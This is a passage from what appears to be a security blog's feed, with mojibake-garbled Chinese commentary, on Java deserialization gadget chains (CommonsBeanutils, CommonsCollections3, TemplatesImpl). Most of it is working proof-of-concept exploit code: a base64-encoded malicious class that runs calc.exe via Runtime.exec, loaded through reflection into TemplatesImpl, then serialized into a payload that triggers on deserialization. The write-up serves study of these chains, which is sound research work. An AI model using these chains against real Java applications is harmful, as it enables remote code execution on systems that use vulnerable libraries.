class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.commons.beanutils.BeanComparator&quot;</span>);<br><span class="hljs-type">Field</span> <span class="hljs-variable">property</span> <span class="hljs-operator">=</span> aClass2.getDeclaredField(<span class="hljs-string">&quot;property&quot;</span>);<br>property.setAccessible(<span class="hljs-literal">true</span>);<br>property.set(beanComparator,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="æ³¨æ„ç‚¹2"><a href="#æ³¨æ„ç‚¹2" class="headerlink" title="æ³¨æ„ç‚¹2"></a>æ³¨æ„ç‚¹2</h2><p>ä¸Šé¢çš„æ·»åŠ ä¸Šååºåˆ—åŒ–ä»ç„¶ä¼šæŠ¥é”™çš„ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051818642.png" alt="image-20220305173956699"></p><p>æ‰€ä»¥pç¥æ‰ä¼šæ„é€ æˆï¼Œ<code>new Object[]&#123;templates,templates&#125;</code>ï¼Œå°†è¿™ä¸¤ä¸ªçš„å€¼ä¼ å…¥äº†<code>o1</code>å’Œ<code>o2</code></p><h2 id="æœ€ç»ˆPOC"><a href="#æœ€ç»ˆPOC" class="headerlink" title="æœ€ç»ˆPOC"></a>æœ€ç»ˆPOC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java">        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp&quot;</span> +<br>                <span class="hljs-string">&quot;dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +<br>                <span class="hljs-string">&quot;L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv&quot;</span> +<br>                <span class="hljs-string">&quot;bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t&quot;</span> +<br>                <span class="hljs-string">&quot;L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k&quot;</span> +<br>                <span class="hljs-string">&quot;bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v&quot;</span> +<br>                <span class="hljs-string">&quot;RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs&quot;</span> +<br>                <span class="hljs-string">&quot;VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy&quot;</span> +<br>                <span class="hljs-string">&quot;YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0&quot;</span> +<br>                <span class="hljs-string">&quot;UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO&quot;</span> +<br>                <span class="hljs-string">&quot;KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA&quot;</span> +<br>                <span class="hljs-string">&quot;AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ&quot;</span> +<br>                <span class="hljs-string">&quot;AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span> );<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        name.set(templates,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><span class="hljs-comment">//</span><br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();<br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>,beanComparator);<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br>        PropertyUtils.getProperty(templates,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br><br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> aClass1.getDeclaredField(<span class="hljs-string">&quot;queue&quot;</span>);<br>        comparator.setAccessible(<span class="hljs-literal">true</span>);<br>        comparator.set(priorityQueue,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates,templates&#125;);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass2</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.commons.beanutils.BeanComparator&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">property</span> <span class="hljs-operator">=</span> aClass2.getDeclaredField(<span class="hljs-string">&quot;property&quot;</span>);<br>        property.setAccessible(<span class="hljs-literal">true</span>);<br>        property.set(beanComparator,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br><br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br><br></code></pre></td></tr></table></figure><p>å“ˆå“ˆå“ˆå…ˆæ°´ä¸€ä¸‹ROMEï¼Œå¾…ä¼šåœ¨æ¥~~åƒé¥­å»äº†ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CommonCollection3</title>
    <link href="/2022/03/05/CommonCollection3/"/>
    <url>/2022/03/05/CommonCollection3/</url>
    
    <content type="html"><![CDATA[<h1 id="CommonsCollections3"><a href="#CommonsCollections3" class="headerlink" title="CommonsCollections3"></a>CommonsCollections3</h1><p>ä¸ºä»€ä¹ˆæœ‰cc3ï¼Œå…¶å®æ˜¯cc1çš„<strong>InvokerTransformer</strong>è¢«ç¦ç”¨äº†ï¼ˆæ— æ³•è¢«ååºåˆ—åŒ–ï¼‰ã€‚<br>é‚£ä¹ˆè¿™é‡Œcc3å‡ºç°äº†<strong>TrAXFilter</strong></p><h2 id="TrAXFilter"><a href="#TrAXFilter" class="headerlink" title="TrAXFilter"></a>TrAXFilter</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051051149.png" alt="QQæˆªå›¾20220305105118"></p><p>è¿™é‡Œå°±ç›´æ¥åœ¨å…¶æ„é€ æ–¹æ³•ä¸­ä½¿ç”¨äº†<strong>newTransformer()<strong>ã€‚ä¸€ç›´è·Ÿè¿›</strong>newTransformerï¼ˆï¼‰</strong>ä¼šæ¥åˆ°ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051203589.png" alt="QQæˆªå›¾20220305110525"></p><p>åç»­åˆ©ç”¨ä¸ä¹…æ˜¯<strong>TemplatesImpl</strong>äº†å—ï¼Ÿ</p><p>é‚£ä¹ˆå¦‚ä½•åˆ©ç”¨è¿™ä¸ªç±»å‘¢ï¼Ÿ</p><h2 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051101285.png" alt="QQæˆªå›¾20220305110121"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051203909.png" alt="QQæˆªå›¾20220305110137"></p><p>åœ¨è¯¥ç±»ä¸­çš„**transform()**é‡Œä½¿ç”¨åå°„ç›´æ¥åˆ›å»ºå‡ºä¸€ä¸ªå®ä¾‹ã€‚</p><p>é‚£ä¹ˆè¿™ä¸å°±æ˜¯å¯ä»¥ç›´æ¥ä¸åˆ©ç”¨InvokerTransformeräº†ï¼Ÿ</p><h2 id="åˆ©ç”¨ä»£ç "><a href="#åˆ©ç”¨ä»£ç " class="headerlink" title="åˆ©ç”¨ä»£ç "></a>åˆ©ç”¨ä»£ç </h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = &#123;<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;)<br>       &#125;;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„åŠŸèƒ½ç›¸å½“äºæ˜¯å®ç°äº†è¿”å›<strong>TrAXFilter</strong>ç±»ï¼Œç„¶åé€šè¿‡ <strong>InstantiateTransformer</strong>å®ä¾‹åŒ–<strong>TrAXFilter</strong>ç±»ï¼Œç„¶åå°±ä¼šè°ƒç”¨å…¶æ„é€ æ–¹æ³•ã€‚ä»è€Œè°ƒç”¨**newTransformer()**ã€‚æ¥ç€å°±æ˜¯cc1çš„å†…å®¹äº†ã€‚</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cc3Demo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, InstantiationException, IOException &#123;<br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp&quot;</span> +<br>                <span class="hljs-string">&quot;dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +<br>                <span class="hljs-string">&quot;L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv&quot;</span> +<br>                <span class="hljs-string">&quot;bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t&quot;</span> +<br>                <span class="hljs-string">&quot;L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k&quot;</span> +<br>                <span class="hljs-string">&quot;bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v&quot;</span> +<br>                <span class="hljs-string">&quot;RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs&quot;</span> +<br>                <span class="hljs-string">&quot;VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy&quot;</span> +<br>                <span class="hljs-string">&quot;YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0&quot;</span> +<br>                <span class="hljs-string">&quot;UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO&quot;</span> +<br>                <span class="hljs-string">&quot;KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA&quot;</span> +<br>                <span class="hljs-string">&quot;AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ&quot;</span> +<br>                <span class="hljs-string">&quot;AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span> );<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        tfactory.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        name.set(templates,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br><br><br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">annotationInvocationdhdlConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationdhdlConstructor.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (InvocationHandler) annotationInvocationdhdlConstructor.newInstance(Override.class, lazyMap);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">mapProxy</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, h);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationdhdlConstructor.newInstance(Override.class, mapProxy);<br><br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>     <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>     objectOutputStream.writeObject(o);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CommonsCollections3ï¼ˆTemplatesImplï¼‰</title>
    <link href="/2022/03/04/CommonsCollections3%EF%BC%88TemplatesImpl%EF%BC%89/"/>
    <url>/2022/03/04/CommonsCollections3%EF%BC%88TemplatesImpl%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="CommonsCollections3ï¼ˆTemplatesImplï¼‰"><a href="#CommonsCollections3ï¼ˆTemplatesImplï¼‰" class="headerlink" title="CommonsCollections3ï¼ˆTemplatesImplï¼‰"></a>CommonsCollections3ï¼ˆTemplatesImplï¼‰</h1><p>ysoserialç”¨cc2æ˜¯è¿™ç§åŠæ³•ã€‚è¿™é‡Œå°±å°†å°±ä¸€ä¸‹ï¼Œç”¨cc3æ¥å®Œæˆè¿™ä¸ªæ•ˆæœã€‚æœ¬è´¨ä¸Šæœ¨æœ‰åŒºåˆ«ã€‚æƒ³å½“äºæ˜¯<strong>TemplatesImpl+cc1çš„ååŠæ®µ</strong>ã€‚æ„Ÿè§‰ä¼šäº†ï¼Œå°±ä¸ç»§ç»­å¤ä¹ äº†ã€‚<strong>ï¼ˆè¿™é‡Œè¿˜æ˜¯åˆ©ç”¨äº†InvokerTransformerï¼‰</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 